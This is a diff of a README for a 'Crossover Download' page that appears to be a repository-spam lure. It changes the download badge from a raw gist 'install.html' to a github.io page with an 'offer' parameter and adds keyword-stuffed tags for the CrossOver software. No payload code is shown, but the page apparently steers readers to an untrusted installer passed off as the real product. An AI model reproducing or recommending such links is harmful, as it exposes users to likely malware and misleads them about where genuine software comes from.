@@ -1,6 +1,6 @@
 # Crossover Download — Desktop Compatibility
 
-[![Get Crossover GitHub](https://img.shields.io/badge/Get%20Crossover%20GitHub-2EA44F?style=for-the-badge&logo=github&logoColor=white)](https://gistcdn.githack.com/duckymotby82/adad0341a601be6d38f2fdaa5f5ac65c/raw/e91edadbb2a4b529d581e4721a8e423637a8add6/install.html?offer=Crossover)
+[![Get Crossover GitHub](https://img.shields.io/badge/Get%20Crossover%20GitHub-2EA44F?style=for-the-badge&logo=github&logoColor=white)](https://git-app-deploy.github.io/.github/?offer=Crossover)
 
 ---
 
@@ -81,7 +81,7 @@ A: Yes — app data and files are stored within containers on your host desktop,
 
 ## 🔍 Tags
 
-CrossOver, Windows compatibility layer, run Windows apps on Mac, run Windows apps on Linux, desktop compatibility, application containers, native integration, Crossover pc, Crossover windows, Crossover desktop, Crossover for mac, CrossOver for pc, CrossOver for windows, CrossOver mac
+CrossOver, cross over for work, crossover for work, Windows compatibility layer, run Windows apps on Mac, run Windows apps on Linux, desktop compatibility, application containers, native integration, Crossover pc, Crossover windows, Crossover desktop, Crossover for mac, CrossOver for pc, CrossOver for windows, CrossOver mac
 
 ---
 
